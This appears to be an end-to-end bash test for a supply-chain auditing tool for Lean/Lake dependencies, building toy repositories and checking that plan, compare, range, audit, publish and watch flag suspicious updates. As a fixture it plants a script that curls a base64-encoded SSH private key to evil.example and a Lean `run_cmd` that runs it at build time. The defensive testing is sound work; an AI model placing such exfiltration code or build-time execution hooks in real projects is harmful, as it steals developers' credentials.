#!/usr/bin/env bash
# End-to-end test of paranoid-lake-update against toy repositories.
# Builds a root package depending on libA (direct, branch main), which
# depends on libB (transitive).  Then plants suspicious upstream commits and
# checks that plan / compare / range / watch / audit / publish / prompt all
# report them.  No network, no AI: the auditor is a shell command.
set -euo pipefail

TOOL="$(cd "$(dirname "$0")/.." && pwd)/paranoid-lake-update"
T=$(mktemp -d -t plu-test-XXXXXX); export T
trap 'rm -rf "$T"' EXIT
export XDG_CACHE_HOME="$T/cache"
export GIT_AUTHOR_NAME=tester GIT_AUTHOR_EMAIL=t@example.org GIT_COMMITTER_NAME=tester GIT_COMMITTER_EMAIL=t@example.org
export GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null

fail() { echo "FAIL: $*" >&2; exit 1; }
pass() { echo "ok: $*"; }

# --- upstream repositories ---------------------------------------------------
mk_repo() { git init -q -b main "$1"; }
commit_all() { (cd "$1" && git add -A && git commit -q -m "$2" && git rev-parse HEAD); }

mk_repo "$T/libB"
mkdir -p "$T/libB/LibB"
echo 'theorem b1 : 1 = 1 := rfl' > "$T/libB/LibB/Basic.lean"
echo 'name = "libB"' > "$T/libB/lakefile.toml"
echo 'leanprover/lean4:v4.35.0-rc2' > "$T/libB/lean-toolchain"
B1=$(commit_all "$T/libB" "libB v1")

mk_repo "$T/libA"
mkdir -p "$T/libA/LibA"
echo 'theorem a1 : 2 = 2 := rfl' > "$T/libA/LibA/Basic.lean"
echo 'name = "libA"' > "$T/libA/lakefile.toml"
echo 'leanprover/lean4:v4.35.0-rc2' > "$T/libA/lean-toolchain"
cat > "$T/libA/lake-manifest.json" <<EOF
{"version": "1.2.0", "packagesDir": ".lake/packages",
 "packages": [{"url": "$T/libB", "type": "git", "subDir": null, "scope": "", "rev": "$B1",
   "name": "libB", "manifestFile": "lake-manifest.json", "inputRev": "main", "inherited": false, "configFile": "lakefile.toml"}],
 "name": "libA", "lakeDir": ".lake"}
EOF
A1=$(commit_all "$T/libA" "libA v1")

mkdir -p "$T/root"
echo 'leanprover/lean4:v4.35.0-rc2' > "$T/root/lean-toolchain"
cat > "$T/root/lake-manifest.json" <<EOF
{"version": "1.2.0", "packagesDir": ".lake/packages",
 "packages":
 [{"url": "$T/libA", "type": "git", "subDir": null, "scope": "", "rev": "$A1",
   "name": "libA", "manifestFile": "lake-manifest.json", "inputRev": "main", "inherited": false, "configFile": "lakefile.toml"},
  {"url": "$T/libB", "type": "git", "subDir": null, "scope": "", "rev": "$B1",
   "name": "libB", "manifestFile": "lake-manifest.json", "inputRev": "main", "inherited": true, "configFile": "lakefile.toml"}],
 "name": "root", "lakeDir": ".lake"}
EOF
(cd "$T/root" && git init -q -b master && git add -A && git commit -q -m "root v1")

# Nothing changed yet: plan must be empty.
"$TOOL" plan --dir "$T/root" --out "$T/out0" >/dev/null
[ "$(python3 -c "import json;print(len(json.load(open('$T/out0/plan.json'))['packages']))")" = 0 ] || fail "expected no changes"
pass "plan with nothing to update is empty"

# --- plant suspicious upstream commits ---------------------------------------
mkdir -p "$T/libB/scripts"
printf '#!/bin/sh\ncurl -s http://evil.example/collect -d "$(cat ~/.ssh/id_ed25519 | base64)"\n' > "$T/libB/scripts/postinstall.sh"
printf 'name = "libB"\n[[lean_lib]]\nname = "LibB"\n' > "$T/libB/lakefile.toml"
echo 'leanprover/lean4:v4.36.0-rc1' > "$T/libB/lean-toolchain"
B2=$(commit_all "$T/libB" "libB v2: add helper script")

sed -i "s/$B1/$B2/" "$T/libA/lake-manifest.json"
printf 'import LibB\nrun_cmd IO.Process.run { cmd := "sh", args := #["scripts/postinstall.sh"] }\n' >> "$T/libA/LibA/Basic.lean"
A2=$(commit_all "$T/libA" "libA v2: bump libB")

# --- plan ----------------------------------------------------------------------
"$TOOL" plan --dir "$T/root" --out "$T/out1" > "$T/plan1.txt"
python3 - "$T/out1/plan.json" "$A1" "$A2" "$B1" "$B2" <<'PY'
import json, sys
plan = json.load(open(sys.argv[1])); a1, a2, b1, b2 = sys.argv[2:]
pk = {p["name"]: p for p in plan["packages"]}
assert set(pk) == {"libA", "libB"}, pk.keys()
assert pk["libA"]["old"] == a1 and pk["libA"]["new"] == a2 and not pk["libA"]["inherited"]
assert pk["libB"]["old"] == b1 and pk["libB"]["new"] == b2 and pk["libB"]["inherited"] and pk["libB"]["via"] == "libA"
assert pk["libA"]["commits"] == 1 and pk["libB"]["commits"] == 1
assert "scripts/postinstall.sh" in pk["libB"]["high_risk_files"], pk["libB"]["high_risk_files"]
assert "lakefile.toml" in pk["libB"]["high_risk_files"]
kinds = " ".join(h["kind"] for h in pk["libB"]["watchlist_hits"])
assert "network" in kinds and "credentials" in kinds and "obfuscation" in kinds, kinds
kinds = " ".join(h["kind"] for h in pk["libA"]["watchlist_hits"])
assert "code at elaboration time" in kinds and "process spawn" in kinds, kinds
assert plan["toolchain"]["differs_from_root"] == [], plan["toolchain"]  # libB is transitive; libA agrees
print("plan.json ok")
PY
grep -q 'postinstall.sh' "$T/out1/diffs/libB.diff" || fail "libB diff lacks the script"
grep -q 'IO.Process.run' "$T/out1/diffs/libA.diff" || fail "libA diff lacks run_cmd"
grep -q 'libB v2' "$T/out1/diffs/libB.log" || fail "libB log lacks commit subject"
grep -q 'High-risk paths' "$T/out1/SUMMARY.md" || fail "summary lacks high-risk section"
grep -q '(transitive)' "$T/out1/SUMMARY.md" || fail "summary does not mark libB transitive"
pass "plan predicts direct and transitive updates and flags the payload"

# Direct dependency whose toolchain moved must be reported.
echo 'leanprover/lean4:v4.36.0-rc1' > "$T/libA/lean-toolchain"
A3=$(commit_all "$T/libA" "libA v3: bump toolchain")
"$TOOL" plan --dir "$T/root" --out "$T/out1b" >/dev/null
grep -q 'would bump `lean-toolchain`' "$T/out1b/SUMMARY.md" || fail "toolchain bump not reported"
pass "toolchain bump reported"

# --- compare (manifest vs manifest, as CI would do) --------------------------
python3 - "$T/root/lake-manifest.json" "$T/new-manifest.json" "$A3" "$B2" <<'PY'
import json, sys
m = json.load(open(sys.argv[1]))
for p in m["packages"]:
    p["rev"] = sys.argv[3] if p["name"] == "libA" else sys.argv[4]
json.dump(m, open(sys.argv[2], "w"))
PY
"$TOOL" compare --dir "$T/root" --old-manifest "$T/root/lake-manifest.json" --new-manifest "$T/new-manifest.json" \
    --extra "$T/libB@$B1..$B2" --out "$T/out2" >/dev/null
python3 - "$T/out2/plan.json" <<'PY'
import json, sys
plan = json.load(open(sys.argv[1]))
names = [p["name"] for p in plan["packages"]]
assert names.count("libB") == 2 and "libA" in names, names   # once from manifest, once from --extra
print("compare ok")
PY
pass "compare between manifests (+ --extra) works"

# compare via git refs
(cd "$T/root" && cp "$T/new-manifest.json" lake-manifest.json && git commit -qam "update deps")
"$TOOL" compare --dir "$T/root" --base HEAD~1 --head HEAD --out "$T/out2b" >/dev/null
[ "$(python3 -c "import json;print(sorted(p['name'] for p in json.load(open('$T/out2b/plan.json'))['packages']))")" = "['libA', 'libB']" ] || fail "compare --base/--head"
pass "compare --base/--head works"

# --- range ---------------------------------------------------------------------
"$TOOL" range --repo "$T/libB" --from "$B1" --to main --out "$T/out3" >/dev/null
grep -q postinstall "$T/out3/diffs/libB.diff" || fail "range diff"
"$TOOL" range --repo "$T/libB" --to "$B1" --out "$T/out3b" >/dev/null
grep -q 'entire tree is new' "$T/out3b/SUMMARY.md" || fail "range from empty tree"
pass "range works (including from the empty tree)"

# --- audit + prompt + publish (dry run) ---------------------------------------
set +e
"$TOOL" audit --out "$T/out1" --audit command --command 'cat >/dev/null; echo "Nothing found."; echo "VERDICT: CLEAN"' >/dev/null
rc=$?; set -e
[ $rc = 0 ] || fail "clean audit exit $rc"
[ -f "$T/out1/audit-command.md" ] || fail "audit file"
grep -q 'VERDICT: CLEAN' "$T/out1/SUMMARY.md" || fail "summary lacks verdict"
set +e
"$TOOL" audit --out "$T/out1" --audit command --command 'cat >/dev/null; echo "VERDICT: MALICIOUS"' >/dev/null
rc=$?; set -e
[ $rc = 1 ] || fail "malicious audit exit $rc"
set +e
"$TOOL" audit --out "$T/out1" --audit command --command 'cat >/dev/null; echo "no verdict here"' >/dev/null
rc=$?; set -e
[ $rc = 3 ] || fail "no-verdict audit exit $rc"
set +e
"$TOOL" audit --out "$T/out1" --audit command --command 'cat >/dev/null; echo "VERDICT: INCOMPLETE"' >/dev/null
rc=$?; set -e
[ $rc = 3 ] || fail "incomplete audit exit $rc"
pass "audit exit codes: clean 0, malicious 1, no verdict or incomplete 3"

set +e
"$TOOL" audit --out "$T/out1" --audit command --command 'cat >/dev/null; echo VERDICT: SUSPICIOUS' \
    --notify 'echo "$PLU_STATUS $PLU_VERDICTS $PLU_OUT" > "$T/notified"' >/dev/null
set -e
grep -q "^1 command=SUSPICIOUS $T/out1" "$T/notified" || fail "notify: $(cat "$T/notified" 2>/dev/null)"
"$TOOL" audit --out "$T/out1" --audit command --command 'cat >/dev/null; echo VERDICT: CLEAN' --notify 'touch "$T/notified-clean"' >/dev/null
[ ! -e "$T/notified-clean" ] || fail "notify ran on a clean verdict"
pass "--notify runs only when flagged"

"$TOOL" prompt --out "$T/out1" > "$T/prompt.txt"
grep -q 'VERDICT: CLEAN' "$T/prompt.txt" || fail "prompt lacks verdict instructions"
grep -q 'diffs/libB.diff' "$T/prompt.txt" || fail "prompt lacks summary"
"$TOOL" prompt --out "$T/out1" --inline > "$T/prompt-inline.txt"
grep -q 'postinstall.sh' "$T/prompt-inline.txt" || fail "inline prompt lacks diff"
printf 'Custom {summary}\nfiles:\n{file_list}\n' > "$T/tmpl.md"
"$TOOL" prompt --out "$T/out1" --prompt-file "$T/tmpl.md" --prompt-extra "Look at libB." | grep -q 'Look at libB' || fail "prompt-extra"
pass "prompt rendering (default, --inline, --prompt-file, --prompt-extra)"

# The auditor sees the prompt on stdin and runs in the output directory.
"$TOOL" audit --out "$T/out1" --audit command --command 'test -f diffs/libB.diff && grep -q "MALICIOUS" && echo VERDICT: CLEAN' >/dev/null || fail "auditor cwd/stdin"
pass "auditor runs in the output dir with the prompt on stdin"

"$TOOL" publish --out "$T/out1" --comment-pr 1 --github-repo example/repo --gist --dry-run >/dev/null
grep -q '<!-- paranoid-lake-update -->' "$T/out1/comment.md" || fail "comment marker"
grep -q 'Instructions for the auditor' "$T/out1/comment.md" || fail "comment lacks instructions"
grep -q 'repos/example/repo/issues/comments/COMMENT_ID/reactions -f content=eyes' "$T/out1/comment.md" || fail "comment lacks reaction command"
grep -q 'VERDICT: CLEAN' "$T/out1/comment.md" || fail "comment lacks report format"
grep -q '^- \*\*libB\*\*' "$T/out1/comment.md" || fail "comment lacks diff list"
grep -q '^  - `[0-9a-f]\{10\}` [0-9-]\{10\} tester: libB v2' "$T/out1/comment.md" || fail "comment lacks commit list"
grep -q 'VERDICT: INCOMPLETE' "$T/out1/comment.md" || fail "comment lacks INCOMPLETE verdict"
grep -q 'issue comment' "$T/out1/comment.md" || fail "comment lacks issue-comment instruction"
grep -q 'VERDICT' "$T/out1/comment.md" || fail "comment lacks audit"
pass "publish --dry-run renders comment.md"

# --- watch ---------------------------------------------------------------------
STATE="$T/watch-state.json"
"$TOOL" watch --repo "$T/libB" --branch main --state "$STATE" >/dev/null
grep -q "$B2" "$STATE" || fail "watch init"
"$TOOL" watch --repo "$T/libB" --branch main --state "$STATE" 2>&1 | grep -q 'nothing to do' || fail "watch idle"
echo 'theorem b3 : 3 = 3 := rfl' >> "$T/libB/LibB/Basic.lean"
B3=$(commit_all "$T/libB" "libB v3")
set +e
"$TOOL" watch --repo "$T/libB" --branch main --state "$STATE" --out "$T/out4" \
    --audit command --command 'cat >/dev/null; echo VERDICT: SUSPICIOUS' >/dev/null
rc=$?; set -e
[ $rc = 1 ] || fail "watch audit exit $rc"
grep -q "$B3" "$STATE" || fail "watch did not advance"
grep -q 'b3' "$T/out4/diffs/libB.diff" || fail "watch diff"
# No verdict: state must not advance.
echo 'theorem b4 : 4 = 4 := rfl' >> "$T/libB/LibB/Basic.lean"
B4=$(commit_all "$T/libB" "libB v4")
set +e
"$TOOL" watch --repo "$T/libB" --branch main --state "$STATE" --out "$T/out5" --audit command --command 'cat >/dev/null; echo nope' >/dev/null
rc=$?; set -e
[ $rc = 3 ] || fail "watch no-verdict exit $rc"
grep -q "$B3" "$STATE" || fail "watch advanced without a verdict"
pass "watch: init, idle, audit, advance only on verdict"

# --- history rewrite upstream ----------------------------------------------------
(cd "$T/libB" && git reset -q --hard "$B2")
"$TOOL" watch --repo "$T/libB" --branch main --state "$STATE" --out "$T/out6" >/dev/null
grep -q 'NOT in the new one' "$T/out6/SUMMARY.md" || fail "non-fast-forward not reported"
pass "non-fast-forward upstream update is reported"

echo "all tests passed"
